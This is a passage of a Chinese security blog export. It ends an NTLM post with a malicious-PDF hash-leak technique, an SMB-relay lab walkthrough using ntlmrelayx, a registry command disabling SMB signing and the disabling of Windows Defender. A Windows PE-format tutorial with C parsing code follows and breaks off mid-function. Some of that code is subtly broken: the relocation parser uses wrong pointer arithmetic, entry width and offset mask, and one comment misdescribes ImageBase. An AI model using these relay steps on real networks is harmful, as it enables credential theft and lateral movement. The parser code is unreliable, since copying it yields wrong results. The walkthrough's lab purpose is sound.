构造pdf\nPDF规范允许为GoTobe和GoToR条目加载远程内容，PDF文件可以添加一项功能，请求远程SMB服务器的文件，我们直接使用三好学生的脚本[https://github.com/3gstudent/Worse-PDF](https://github.com/3gstudent/Worse-PDF)\n\n当受害者使用PDF阅读器打开恶意的PDF时可导致载荷成功执行，并返回NTLM-Hash\n\n\n\n\n\n其他方式还有构造word，设置用户图像等等，就不细看了，可以参考：[https://xz.aliyun.com/t/13124?time__1311=GqmhqUxoGKGNDQtiQY0QiMG2GDk3IAeD#toc-10](https://xz.aliyun.com/t/13124?time__1311=GqmhqUxoGKGNDQtiQY0QiMG2GDk3IAeD#toc-10)\n\n和\n\n[发起NTLM 请求 | windows protocol](https://daiker.gitbook.io/windows-protocol/ntlm-pian/5)\n\n\n\n### Net-NTLM Relay\n#### SMB-Relay\n懂的，中继,Relay,重放是一个意思\n\n\n\n条件：relay到smb服务要求被攻击机器不能开启SMB签名，域内主机的 SMB 签名默认关闭，但域控是默认开启的\n\n\n\n> 在SMB连接中需要使用安全机制来保护服务器和客户端之间传输数据的完整性，而这种安全机制就是SMB签名和加密，如果关闭SMB签名，会允许攻击者拦截认证过程并且将获得hash在其他机器上进行重放，从而获得域管权限，目前SMB常用来做为SMB文件共享、打印机，如果签名关闭可能导致文件共享、打印机被入侵\n>\n\n使用nmap查看是否关闭SMB签名\n\n```powershell\nnmap -n -p445 192.168.120.135 --script=smb-security-mode\n```\n\n关闭签名\n\n```powershell\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v RequireSecuritySignature /t REG_DWORD /d 0 /f\n```\n\n> SMB-Relay又分为在工作组环境下和在域环境下，但是一般工作组环境下比较少。\n>\n> 1. 工作组环境：在工作组环境中，工作组中的机器之间相互没有信任关系，每台机器的账号密码只是保存在自己的SAM文件中，这个时候Relay到别的机器，除非两台机器的账号密码一样，不然没有别的意义了。但是如果账号密码相同的话，为何不直接Pass The Hash攻击呢？因此在工作组环境下，Relay到其他机器不太现实。这个时候的攻击手段就是将机器Relay回机子本身。因此微软在ms08-068中对Relay到自身机器做了限制，严禁Relay到机器自身。CVE-2019-1384(Ghost Potato)就是绕过了该补丁。\n> 2. 域环境：在域环境中，默认普通域用户可以登录除域控外的其他所有机器(但是为了安全，企业运维人员通常会限制域用户登录的主机)，因此可以将Net-NTLM Hash Relay到域内的其他机器。如果是拿到了域控机器的Net-NTLM Hash，可以Relay到除域控外的其他所有机器(为啥不Relay到其他域控，因为域内只有域控默认开启SMB签名)。\n>\n\n\n\n因为工作组环境的适用环境比较少，这里主要讨论下域环境下的。\n\n\n\n可以检查注册表\n\n```shell\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManWorkstation\\Parameters\n```\n\n<img src=\"/img/24-11-2/16.png\" >\n\n\n\n所以攻击场景为：拿下了域控，然后smb-relay域内其他主机\n\n\n\n\n\n开启SMBv1协议（pass）\n\n```powershell\nEnable-WindowsOptionalFeature -Online -FeatureName smb1protocol\n```\n\n\n\n嗯，实际好像在用SMB2 (Win10)\n\n\n\n环境：\n\n+ Win10 : 192.168.120.135\n+ Windows Server 2019 : 192.168.120.139\n+ kali : 192.168.120.140\n\n\n\n试过网上的几种方法\n\nresponder 中的MultiRelay.py, kali自带的smbrelayx.py都不行，\n\n自带的没有支持smb2协议\n\n\n\n**impacket**\n\n项目地址：https://github.com/fortra/impacket/tree/master\n\n\n\n切换到examples目录\n\n```shell\npython3 ntlmrelayx.py -t 192.168.120.135 -c whoami  -smb2support\n```\n\n\n\n<img src=\"/img/24-11-2/17.png\" >\n\n这里只能使用http\n\n通过社工手段让域控访问攻击者ip并输入用户密码（或者是已经拿下域控）\n\n<img src=\"/img/24-11-2/18.png\" >\n\n这里需要域管的账号，否则后面可能报没有权限的错误\n\n<img src=\"/img/24-11-2/19.png\" >\n\n这里可以发现smb认证成功了，但是好像没有执行命令\n\n登上win10看看，发现是被Windows安全中心拦截了\n\n<img src=\"/img/24-11-2/20.png\" >\n\n手动关闭Windows安全中心病毒防护\n\n<img src=\"/img/24-11-2/21.png\" >\n\n经历千辛万苦，折磨了半天，终于命令执行成功了，拿下了system权限\n\n\n\n后续可以上cs马等等\n\n\n\n当然这里的细节就涉及具体的漏洞，像MS08-068，CVE-2015-0005等等\n\n\n\n可以参考：[漏洞概述 | windows protocol](https://daiker.gitbook.io/windows-protocol/ntlm-pian/7#id-2.-cve-2015-0005)\n\n其他没有提到的利用，可以参考：[Net- NTLM 利用 | windows protocol](https://daiker.gitbook.io/windows-protocol/ntlm-pian/6)\n\n## 后序\n本篇就介绍了NTLM的认证协议，Net-NTLM Hash，PTH ,NTLM-Relay 等等，其中肯定还有许多的东西只提及到一点点，像PTH,NTLM Relay其他攻击方式，SMB -Relay的其他漏洞等等\n\n\n\n这位师傅写的就比较全:[https://en.hackndo.com/ntlm-relay/](https://en.hackndo.com/ntlm-relay/)\n\n\n\n以后若再遇到，再更新\n\n\n\n这也大致了解了NTLM-Hash 和Net-NTLM Hash 的一些利用手法\n\n\n\n## Reference\n+ [NTLM 基础 介绍 | windows protocol (gitbook.io)](https://daiker.gitbook.io/windows-protocol/ntlm-pian/4)\n+ https://en.hackndo.com/pass-the-hash/#protocol-ntlm\n+ https://en.hackndo.com/ntlm-relay/\n+ https://xz.aliyun.com/t/12627\n+ https://www.vaadata.com/blog/understanding-ntlm-authentication-and-ntlm-relay-attacks/\n+ https://xz.aliyun.com/t/8117\n+ https://xz.aliyun.com/t/13124\n+ https://exp10it.io/2019/07/smb-%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/\n+ https://qingwan.top/2024/01/23/ntlm%20relay\n+ https://www.cnblogs.com/yokan/p/16102699.html\n+ https://tttang.com/archive/1548/#toc_0x003-smbrelayxpy\n\n","tags":["Windows","协议","NTLM","横向移动","内网渗透"],"categories":["Windows"]},{"title":"PE文件结构","url":"/2024/10/30/PE文件结构/","content":"\n\n\n\n\n\npe文件结构只能说算一点点基础，顺带学习PE的时候再熟悉熟悉c语言和Windows API\n\n\n\nPE文件即Portable Execute Windows下可执行文件的总称，常见的有 DLL，EXE，OCX，SYS 等，PE文件可以说是在各个领域都有涉及，特别是病毒领域，内网渗透中的免杀对抗\n\n(免杀对抗环境从普通的杀软到edr,xdr等设备)\n\n## 基础知识\nPE文件的结构有两种表现形式：一是存储在在硬盘中的文件，二是加载在内存中\n\n<img src=\"/img/24-10-30/1.png\" >\n\n如上图可见，当PE文件加载到内存中后，DOS头到最后一个节区头的部分是一致的，而之后节区与节区之间的间隔，内存中的间隔会更大\n\n\n\n产生差异是因为内存对齐，主要是下面两点：\n\n+ 操作系统通常以内存分页为单位（通常是 4 KB 或 2 MB 等）来管理内存。加载 PE 文件时，每个节会被分配到与分页边界对齐的内存地址\n+ 在 PE 文件的头信息中，SectionAlignment 字段定义了各个节(段)在内存中的对齐方式。这种对齐方式一般也选择 4 KB 或更大，以保证节在内存中符合分页要求\n\n\n\n在开始之前，先来点基础概念。对于学过操作系统的来说，这应该很好理解\n\n\n\n1. 地址\n\n一般是指虚拟地址，而非物理地址，我们知道程序运行时候是使用操作系统分配的内存空间，所以用户并不知道具体的物理地址。\n\n1. 镜像文件\n\n包含以 EXE 文件为代表的 “可执行文件”、以DLL文件为代表的“动态链接库”。因为他们常常被直接“复制”到内存，有“镜像”的某种意思。\n\n2. RAV\n\nRelatively Virtual Address。偏移(又称“相对虚拟地址”)。相对镜像基址的偏移。\n\n一般来说，PE文件在硬盘上和在内存里是不完全一样的。各个节在硬盘上是连续的，而在内存中是按页对齐的，所以加载到内存以后节之间会出现一些 “空洞”，这样占用的空间就会大一些 。\n\n因为存在这种对齐，所以在 PE 结构内部，表示某个位置的地址采用了两种方式：\n\n- 针对在硬盘上存储文件中的地址，称为 原始存储地址 或 物理地址，表示距离文件头的偏移。\n- 针对加载到内存以后映象中的地址，称为 相对虚拟地址(RVA)，表示相对内存映象头的偏移。\n\nRVA 是当PE 文件被装到内存中后，某个数据位置相对于文件头的偏移量。\n\n3. VA\n\nVirtual Address。虚拟地址，程序在虚拟内存中被装载的位置\n\n4. ImageBase：基址\n\nPE文件的优先装载地址。比如，如果该值是400000h，PE装载器将尝试把文件装到虚拟地址空间的400000h处。字眼\"优先\"表示若该地址区域已被其他模块占用，那PE装载器会选用其他空闲地址。简而言之，就是指定PE文件载入内存时，优先尝试载入的内存起始地址。\n\n\n\n\n\n作为web手，来看这些的时候，不得不重新审视一下结构体\n\n首先结构体其实类似于数组，也是一段连续的内存块，只不过他内存块中每一块的大小由结构体成员决定\n\nc语言中结构体访问成员的操作，实际转化为汇编中访问 ：结构体的基址+成员的偏移量（一般都是一个立即数）\n\n如果已知结构体的定义，并且有结构体在内存中的基址，就可以解析对应的内存区域并读取其中的数据结构。（这些偏移量是在编译期由编译器根据结构体定义、数据类型大小以及对齐规则计算得到的）\n\n\n\n\n\n\n\nPE结构可以大致分为:\n\n+ DOS部分\n+ PE文件头\n+ 节表(块表)\n+ 节数据(块数据)\n+ 调试信息\n\n\n\n\n\n结构如图：\n\n<img src=\"/img/24-10-30/2.png\" >\n\n\n\nPE 指纹\n\n+ 首先是根据文件的前两个字节是否为4D 5A，也就是’MZ’，\n+ 然后后面还存在50 45，也就是PE\n\n<img src=\"/img/24-10-30/3.png\" >\n\n\n\n\n\n## DOS头\n​\tDOS部分主要是为了兼容以前的DOS系统，DOS部分可以分为DOS MZ文件头(IMAGE_DOS_HEADER)和DOS块(DOS Stub)组成，PE文件的第一个字节位于一个传统的MS-DOS头部，称作IMAGE_DOS_HEADER，其结构如下：\n\n(WORD 2字节 16位\n\nDWORD 4字节 32位)\n\n```c\ntypedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header\n    WORD   e_magic;                     // Magic number\n    WORD   e_cblp;                      // Bytes on last page of file\n    WORD   e_cp;                        // Pages in file\n    WORD   e_crlc;                      // Relocations\n    WORD   e_cparhdr;                   // Size of header in paragraphs\n    WORD   e_minalloc;                  // Minimum extra paragraphs needed\n    WORD   e_maxalloc;                  // Maximum extra paragraphs needed\n    WORD   e_ss;                        // Initial (relative) SS value\n    WORD   e_sp;                        // Initial SP value\n    WORD   e_csum;                      // Checksum\n    WORD   e_ip;                        // Initial IP value\n    WORD   e_cs;                        // Initial (relative) CS value\n    WORD   e_lfarlc;                    // File address of relocation table\n    WORD   e_ovno;                      // Overlay number\n    WORD   e_res[4];                    // Reserved words\n    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)\n    WORD   e_oeminfo;                   // OEM information; e_oemid specific\n    WORD   e_res2[10];                  // Reserved words\n    LONG   e_lfanew;                    // File address of new exe header\n  } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;\n```\n\n如果为DOS系统就会执行，打印输出一句话\n\n然后其中比较重要的是e_lfanew 字段 ，是PE文件头的偏移地址\n\n解析的时候读取为char*  , 然后赋值给一个结构体变量即可\n\n（相当于把指针赋值给结构体变量，能通过对应的属性偏移值来访问属性）\n\n## PE 头\nPE 头也叫NT头\n\nPE头位于DOS Stub 后面，是以PE00为起始标记`\n\n对应c语言中如下结构体：\n\n```c\ntypedef struct _IMAGE_NT_HEADERS {\n    DWORD Signature;\t\t//PE标志，4字节 ,8位16进制数据\n    IMAGE_FILE_HEADER FileHeader;\t//文件头\n    IMAGE_OPTIONAL_HEADER32 OptionalHeader;\t\t//可选PE头\n} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;\n```\n\n其中文件头:\n\n```c\ntypedef struct _IMAGE_FILE_HEADER {\n    WORD    Machine; //程序允许的CPU型号 如果为0表示能在任何CPU上允许  \n    WORD    NumberOfSections;\t\t//文件中存在区段的数量\n    DWORD   TimeDateStamp;\t\t\t//时间戳\n    DWORD   PointerToSymbolTable;\n    DWORD   NumberOfSymbols;\n    WORD    SizeOfOptionalHeader;\t//可选PE头的大小\n    WORD    Characteristics;\t\t// 文件属性\n} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;\n```\n\n### 可选PE头\n可选PE头，虽说是可选PE头，但里面包含了很多重要的信息\n\n```c\ntypedef struct _IMAGE_OPTIONAL_HEADER {\n\n      WORD Magic;\t\t\t\t\t\t//值为10B 表示32位程序,若是20B 表示64位程序\n      BYTE MajorLinkerVersion;\n      BYTE MinorLinkerVersion;\n      DWORD SizeOfCode;\t\t\t\t\t//所有代码段的总大小，按照FileAlignment对齐后的大小\n      DWORD SizeOfInitializedData;\t\t//已初始化的数据大小，按照FileAlignment对齐后的大小\n      DWORD SizeOfUninitializedData;\t//未初始化的数据段大小，按照FileAlignment对齐后的大小\n      DWORD AddressOfEntryPoint;\t\t//程序入口 OEP\n      DWORD BaseOfCode;\t\t\t\t\t//代码段开始地址\n      DWORD BaseOfData;\t\t\t\t\t//数据段开始地址\n      DWORD ImageBase;\t\t\t\t\t//内存镜像大小\n      DWORD SectionAlignment;\t\t\t//内存对齐方式\n      DWORD FileAlignment;\t\t\t\t//文件对齐大小\n      WORD MajorOperatingSystemVersion;\n      WORD MinorOperatingSystemVersion;\n      WORD MajorImageVersion;\n      WORD MinorImageVersion;\n      WORD MajorSubsystemVersion;\n      WORD MinorSubsystemVersion;\n      DWORD Win32VersionValue;\n      DWORD SizeOfImage;\t\t\t\t//文件在内存中的大小\n      DWORD SizeOfHeaders;\t\t\t\t// DOS头+标准PE头+可选PE头+区段头 的大小\n      DWORD CheckSum;\n      WORD Subsystem;\n      WORD DllCharacteristics;\n      DWORD SizeOfStackReserve;\n      DWORD SizeOfStackCommit;\n      DWORD SizeOfHeapReserve;\n      DWORD SizeOfHeapCommit;\n      DWORD LoaderFlags;\n      DWORD NumberOfRvaAndSizes;\t\t//数据目录表的个数\n      IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; //数据目录表，数组大小为16\n    } IMAGE_OPTIONAL_HEADER32,*PIMAGE_OPTIONAL_HEADER32;\n```\n\n可选PE头中DataDirectory 数据目录又存放了很多表的地址，如导入\\导出表、重定位表等等是一个十分重要的字段，之后会经常使用, 且DataDirectory是一个长度为16的数组\n\n程序在硬盘(文件）和内存中的对齐方式不相同,导致会有rawSize\n\n\n\n\n\n**RAV与FOA**\n\npe文件在硬盘和内存中的对齐方式不尽相同，导致内存中的偏移(RAV)与在文件中的偏移(FOA )不相同(有些地方又把FOA称之为RAW)\n\n很多时候字段表示的是在内存中的偏移，而我们解析pe文件的时候，只是将文件的内容放入一个char* 的buffer 中而不是加载进内存来运行，因此要将RAV转化为FOA\n\n这些不同只存在于不同的区段（区段对齐大小不一样）\n\n### 区段(节区)头\n学过汇编就知道，一个可执行程序是分段的，指令存放在代码段，数据存放在数据段，等等还有其他的区段\n\n常见节区有code、text、data、resource等。\n\n(区段头就是例如数据段、代码段等等的区段的信息)\n\n把PE文件创建成多个节区结构的好处是，可以保证程序的安全性。若把code与data放在一个节区中相互纠缠很容易引发安全问题，即使忽略过程中的烦琐。假设向字符串data写入数据时，由于某个原因导致溢出，那么其下的code就会被覆盖，应用程序就会崩溃。\n\n| 类别 | 访问权限 |\n| --- | --- |\n| code节区 | 执行、读取权限 |\n| data节区 | 非执行、读写权限 |\n| resource节区 | 非执行、读取权限 |\n\n\n结构体如下：\n\n```c\ntypedef struct _IMAGE_SECTION_HEADER {\n      BYTE Name[IMAGE_SIZEOF_SHORT_NAME];\t\t//区段名称，此处非字符串，不会以0结尾(不能直接使用char)\n      union {\n\tDWORD PhysicalAddress;\n\tDWORD VirtualSize;\n      } Misc;\t\t\t\t\t\t\t\t\t//在内存中的真实大小（未对齐）\n      DWORD VirtualAddress;\t\t\t\t\t\t//区段在内存中的偏移值 + ImageBase 为真正的地址\n      DWORD SizeOfRawData;\t\t\t\t\t\t// 区段在文件中对齐后的大小\n      DWORD PointerToRawData;\t\t\t\t\t//区段在文件中的偏移地址\n      DWORD PointerToRelocations;\n      DWORD PointerToLinenumbers;\n      WORD NumberOfRelocations;\n      WORD NumberOfLinenumbers;\n      DWORD Characteristics;\t\t\t\t\t// 节属性如可读，可写，可执行等\n    } IMAGE_SECTION_HEADER,*PIMAGE_SECTION_HEADER;\n```\n\n解析第一个区段头使用官方定义的宏函数\n\n```plain\nIMAGE_FIRST_SECTION(pNtHeaders);\n```\n\n在PE文件中，节区头部是一个连续的结构体数组，每个 IMAGE_SECTION_HEADER 结构体大小固定，因此可以通过简单递增指针的方式访问下一个节区。\n\n简单解析的代码\n\n```c\nvoid ParsePEFromBuffer(char *buffer, bool debug) {\n    //PIMAGE_DOS_HEADER为指针 ，将buffer的地址直接赋值 ,解析结构体属性的时候就直接能按照属性偏移获取\n    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;\n    //检查DOS头 签名\n    if (pDosHeader->e_magic != 0x5A4D) {\n        printf(\"不是有效的PE文件\\n\");\n        delete[] buffer;\n        return;\n    }\n\n    //NT头偏移= buffer 的偏移地址+ PE文件头偏移\n    PIMAGE_NT_HEADERS pNtHeaders =(PIMAGE_NT_HEADERS) (pDosHeader->e_lfanew +(uintptr_t) buffer); \n    if (0x4550 != pNtHeaders->Signature) {\n        printf(\"不是有效的PE文件结构\");\n        delete[] buffer;\n        return;\n    }\n    //获取PE 文件头\n    PIMAGE_FILE_HEADER pFileHeader = &pNtHeaders->FileHeader;\n    if (debug) {\n        printf(\"Machine:%x\\n\", pFileHeader->Machine);\n        printf(\"区段数：%d\\n\", pFileHeader->NumberOfSections);\n        printf(\"可选头大小:%d\\n\", pFileHeader->SizeOfOptionalHeader);\n    }\n    //获取可选PE头\n    PIMAGE_OPTIONAL_HEADER pOptionHeader=&pNtHeaders->OptionalHeader;\n    if(debug){\n        if(0x20b==pOptionHeader->Magic){\n            printf(\"64位程序\\n\");\n        } else{\n            printf(\"32位程序\\n\");\n        }\n        printf(\"程序入口地址偏移:%x\\n\",pOptionHeader->AddressOfEntryPoint);\n    }\n\n    //使用官方的宏函数 获取第一个区段头\n    PIMAGE_SECTION_HEADER  pSectionHeader= IMAGE_FIRST_SECTION(pNtHeaders) ;\n    for(int i=0;i<pFileHeader->NumberOfSections;i++){\n        //区段名为8个长度+ 0 字符串结尾\n        char name[9]{0};\n        //区段名不能直接使用char引用，直接copy内存\n        memcpy_s(name,9,pSectionHeader->Name,8);\n        printf(\"----------------第%d个区段--------------------------\\n\",i+1);\n        printf(\"名称：%s\\n\",name);\n        printf(\"内存地址偏移： %x\\n\",pSectionHeader->VirtualAddress);\n        printf(\"区段大小：%d\\n\",pSectionHeader->SizeOfRawData);\n        //因为 所在的地方是一个数组，所以+1能够指向下一个元素\n        pSectionHeader++;\n    }\n```\n\n### FOA 和RAV转化\n<img src=\"/img/24-10-30/4.png\" >\n\n经过上面变化，才有了RAV和FOA区分,但是只是各个区段部分，发生了变化，PE头和DOS头其实还是没变,DOS头和PE头中RAV=FAO的\n\n​\t大多数的时候都是RAV，如何将其转化为FOA？\n\n尽管相对于的文件头的偏移变了，但是相对于区段起始的偏移并未改变\n\n因此可以得到公式：\n\n```c\nFOA-所在区段FOA = RAV- 所在区段的RAV \t=>\n\nFOA = RAV- 所在区段的RAV + 所在区段FOA\n```\n\n还有一点就是如何确定所在的区段，简单的方法就是遍历区段表\n\n比较是否在区段的RAV范围：\n\n```c\nRAV>=pSectionHeader->VirtualAddress && RAV< pSectionHeader->VirtualAddress+pSectionHeader->Misc.VirtualSize\n```\n\n转化代码：\n\n```c\nDWORD CPeUtil::RavToFoa(DWORD RAV) {\n    //FOA=数据的FOA+数据的RVA-区段的RVA\n    PIMAGE_SECTION_HEADER  pSectionHeader=IMAGE_FIRST_SECTION(peHeader->ntHeaders);\n   // 遍历区段，比较RAV,获取所在的区段\n    for(int i=0;i<peHeader->ntHeaders->FileHeader.NumberOfSections;i++){\n        if (RAV>=pSectionHeader->VirtualAddress && RAV< pSectionHeader->VirtualAddress+pSectionHeader->Misc.VirtualSize){\n            return RAV-pSectionHeader->VirtualAddress+pSectionHeader->PointerToRawData;\n        }\n        pSectionHeader++;\n    }\n    return 0;\n}\n```\n\n## 导入/导出表\n### 导出表\n数据目录DataDirectory是可选PE头中的字段是一个数组,每一个元素都指向了一些结构（如导入、导出表、重定位表）\n\n数据目录元素的结构体IMAGE_DATA_DIRECTORY如下：\n\n```c\ntypedef struct _IMAGE_DATA_DIRECTORY {\n      DWORD VirtualAddress;\t\t\t//内存中的偏移\n      DWORD Size;\t\n    } IMAGE_DATA_DIRECTORY,*PIMAGE_DATA_DIRECTORY;\n```\n\ndll动态链接库中需要的导出的函数，都会写入导出表 ，导出表是数据目录表中的第一个元素\n\n然而不是只有dll有导出表（一般情况下exe没有导出表）\n\n\n\n导出表IMAGE_EXPORT_DIRECTORY 结构体如下：\n\n```c\ntypedef struct _IMAGE_EXPORT_DIRECTORY {\n      DWORD Characteristics;\n      DWORD TimeDateStamp;\n      WORD MajorVersion;\n      WORD MinorVersion;\n      DWORD Name;\t\t\t\t\t\t//指向导出表文件名 RAV\n      DWORD Base;\t\t\t\t\t\t//导出函数起始序列\n      DWORD NumberOfFunctions;\t\t\t//导出函数的个数\n      DWORD NumberOfNames;\t\t\t\t//以名称导出函数个数\n      DWORD AddressOfFunctions;\t\t\t//导出函数地址表 RAV\n      DWORD AddressOfNames;\t\t\t\t//导出函数名称表 RAV\n      DWORD AddressOfNameOrdinals;\t\t//导出函数序号表 RAV\n    } IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;\n```\n\n按照名称取出函数（地址表、序列表、名称表之间的关系）\n\n\n\n名称表中函数名称所在的索引-> 序列表中对应元素中的序列号 -> 地址表中所对应的元素\n\n解析导出表代码：\n\n```c\nlist<PExportFunc> CPeUtil::GetExportTable() {\n    list<PExportFunc> exportFuncList;\n     IMAGE_DATA_DIRECTORY exportDirectory =pOptionHeader->DataDirectory[0];\n    if (exportDirectory.VirtualAddress==0){\n        //没有导出表\n        printf(\"not exist export table\\n\");\n        return exportFuncList;\n    }\n     DWORD offset= RavToFoa(exportDirectory.VirtualAddress);\n    if (offset==0){\n        //没有导出表\n        printf(\"not found export table\\n\");\n        return exportFuncList;\n    }\n    PIMAGE_EXPORT_DIRECTORY peExport=PIMAGE_EXPORT_DIRECTORY (buffer+offset);\n    char* dllName=RavToFoa(peExport->Name)+ buffer;\n    printf(\"dll name:%s\\n\",dllName);\n    //获取函数地址表数组\n    DWORD* funcAddr=(DWORD *)(RavToFoa(peExport->AddressOfFunctions)+buffer);\n    //获取函数序列表数组\n    WORD* ordinal= (WORD*)(RavToFoa(peExport->AddressOfNameOrdinals)+buffer);\n    //获取名称表\n    DWORD* names=(DWORD *)(RavToFoa(peExport->AddressOfNames)+buffer);\n    for (int i=0;i<peExport->NumberOfFunctions;i++){\n        PExportFunc func=new  ExportFunc{};\n        func->VirtualAddress=funcAddr;\n        for(int j=0;j<peExport->NumberOfNames;j++){\n            if(ordinal[j]==i){\n                //序列号等于函数地址表元素的索引\n               char* name=  RavToFoa(names[j])+buffer;\n               func->Ordinal=ordinal[j];\n               func->Name=name;\n               break;\n            }\n        }\n        exportFuncList.push_back(func);\n        funcAddr++;\n    }\n    return exportFuncList;\n}\n```\n\n### 导入表\n简单的就是：告诉系统你需要用到哪些dll，用哪些函数。\n\n需要导入调用外部函数\n\n\n\n调用多个dll就会有如下多个_IMAGE_IMPORT_DESCRIPTOR结构，导入描述符\n\n```c\ntypedef struct _IMAGE_IMPORT_DESCRIPTOR {\n      union {\n\tDWORD Characteristics;\t\t//标志 为0表示结束 没有导入描述符了\n\tDWORD OriginalFirstThunk;\t//RVA指向IMAGE_THUNK_DATA结构数组\n      } DUMMYUNIONNAME;\n      DWORD TimeDateStamp;\n\n      DWORD ForwarderChain;\t//链表的前一个结构\n      DWORD Name;\t\t\t//RVA，指向DLL名字，该名字以’’\\0’’结尾\n      DWORD FirstThunk;\t\t//RVA指向IMAGE_THUNK_DATA结构数组\n    } IMAGE_IMPORT_DESCRIPTOR;\n```\n\n上述结构体中的OriginalFirstThunk和FirstThunk分别指向其对应的INT表和IAT表\n\n+ IAT (Import Address Table) 导入函数地址表\n+ INT(Import Name Table)导入函数名称表\n\n\n\n加载DLL的方式实际有两种:一种是显示链接(Explicit Linking),程序使用DLL时加载,函数使用完毕时再释放内存; 一种是隐式链接(Implicit Linking),程序开始时就加载DLL,程序终止时再释放占用的内存。(以后遇到再说(:\n\n\n\n<img src=\"/img/24-10-30/5.png\" >\n\nOriginalFirstThunk: 指向IMAGE_THUNK_DATA结构数组的RVA, 其内容在程序未运行下,  \n和OriginalFirstThunk内容一样,,如下：\n\n```c\ntypedef struct _IMAGE_THUNK_DATA64 {\n      union {\n\tULONGLONG ForwarderString;\n\tULONGLONG Function;\t\t//导入函数的地址\n\tULONGLONG Ordinal;\t\t//导入函数的序列号\n\tULONGLONG AddressOfData; //指向IMAGE_IMPORT_BY_NAME,导入名称\n      } u1;\n    } IMAGE_THUNK_DATA64;\n    typedef IMAGE_THUNK_DATA64 *PIMAGE_THUNK_DATA64;\n```\n\n这4个成员是一个共用体, 在不同情况下代表不同的数据\n\n\n\n这个值最高位为1的时候,表示函数是一个序号输出值, 低31位会被看做API的导出序号, 当最高位为0时,  \n这时候这个值是一个指向IMAGE_IMPORT_BY_NAME结构的RVA\n\n```c\ntypedef struct _IMAGE_IMPORT_BY_NAME {\n      WORD Hint;\n      CHAR Name[1]; //需导入的函数名称(不定长且以\\0结尾)\n    } IMAGE_IMPORT_BY_NAME,*PIMAGE_IMPORT_BY_NAME;\n```\n\nFirstThunk : 指向IAT,不过在不同的情况下IAT内容不一样。\n\n\n\n当TimeDateStamp为0的时候表示未绑定，该字段其实跟OriginalFirstThunk 指向的差不多，对应上图PE加载前\n\n\n\n当TimeDateStamp不为0，这时候指向的是函数真实地址表，对应上图PE加载后\n\n解析代码：\n\n```c\ntypedef struct ImportFunc{\n    char* dllName; //dll名称\n    bool useName;  //是否使用名字导入\n    char* name;     //函数名\n    DWORD Ordinal;  //函数序列号\n}ImportFunc,*PImportFunc;\n```\n\n解析函数，（接着前面的代码）\n\n```cpp\nlist<PImportFunc> CPeUtil::GetImportTable() {\n    list<PImportFunc> importFuncList;\n    IMAGE_DATA_DIRECTORY importDirectory =pOptionHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];\n    //获取到导入表首个元素\n    PIMAGE_IMPORT_DESCRIPTOR pImportTable=(PIMAGE_IMPORT_DESCRIPTOR)(RavToFoa(importDirectory.VirtualAddress)+buffer);\n    while (pImportTable->OriginalFirstThunk){\n\n        //dll名称\n        char * dllName= RavToFoa(pImportTable->Name)+buffer;\n\n        PIMAGE_THUNK_DATA pThunkData=(PIMAGE_THUNK_DATA)(RavToFoa(pImportTable->OriginalFirstThunk)+buffer);\n        //遍历所有导入函数\n        while (pThunkData->u1.Function) {\n            PImportFunc  func=new ImportFunc ();\n            //判断最高位是否为1,判断是否按照序号导入\n            if (pThunkData->u1.Ordinal & 0x80000000) {\n                //低31位为序号\n                //printf(\"按照序号导入:%d\\n\",pThunkData->u1.Ordinal & 0x7FFFFFFF) ;\n                func->dllName=dllName;\n                func->useName= false;\n                func->Ordinal=pThunkData->u1.Ordinal & 0x7FFFFFFF;\n\n            } else {\n                PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME) (RavToFoa(pThunkData->u1.AddressOfData) +\n                buffer);\n                // printf(\"按照名称导入:%s\\n\", pImportByName->Name);\n                func->dllName=dllName;\n                func->useName= true;\n                func->name = pImportByName->Name;\n            }\n            importFuncList.push_back(func);\n            pThunkData++;\n        }\n        pImportTable++;\n    }\n    return importFuncList;\n\n}\n```\n\n## 重定位表\n重定位(<font style=\"color:rgb(31, 31, 31);\">Relocation</font>)：代码重定位是把可执行代码从内存的一块区域移动到另外一块地方。但是如果指令中某些操作数没有随着地址的改变而改变，这样势必导致运行出错。如：全局变量的地址包含在机器码中，而局部变量没有包含绝对地址。\n\n​\t重定位信息是在编译时期由编译器生成，并且保存在应用程序中，在程序执行的时候由操作系统予以修正。如果在装载时该位置已经被别的应用程序使用，操作系统会重新选择一个新的基地址。此时，就需要对所有重定位信息进行纠正，纠正的依据就是PE中的重定位表。\n\n重定位表是数据目录中的第6项，索引为5\n\n\n\n对应IMAGE_BASE_RELOCATION结构体：\n\n```cpp\ntypedef struct _IMAGE_BASE_RELOCATION {\nDWORD VirtualAddress;\nDWORD SizeOfBlock;\n} IMAGE_BASE_RELOCATION;\ntypedef IMAGE_BASE_RELOCATION UNALIGNED *PIMAGE_BASE_RELOCATION;\n```\n\n其结构也如下：\n\n\n\n<img src=\"/img/24-10-30/6.png\" >\n\n\n\n解析代码：\n\n```cpp\n//解析重定位表\nlist<DWORD> CPeUtil::GetReLocation() {\n    list<DWORD> rvaList;\n    IMAGE_DATA_DIRECTORY relocationDirectory =pOptionHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n    PIMAGE_BASE_RELOCATION pRelocation=(PIMAGE_BASE_RELOCATION)(RavToFoa(relocationDirectory.VirtualAddress)+buffer);\n\n    while (1){\n        if(pRelocation->VirtualAddress==0){\n            break;\n        }\n        //获取到指向元素的指针\n        DWORD* prelocOffset =(DWORD*)pRelocation+4;\n        //获取块元素个数\n        DWORD number= (pRelocation->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/2;\n        for(int i=0;i<number;i++){\n            //判断高两位是否为3\n            if((*prelocOffset & 0x3000)== 0x3000){\n                //取低几位,并加上基址\n                DWORD rva =((*prelocOffset) & 0x0FF) + pRelocation->VirtualAddress;\n                rvaList.push_back(rva);\n            }\n\n            prelocOffset++;\n        }\n        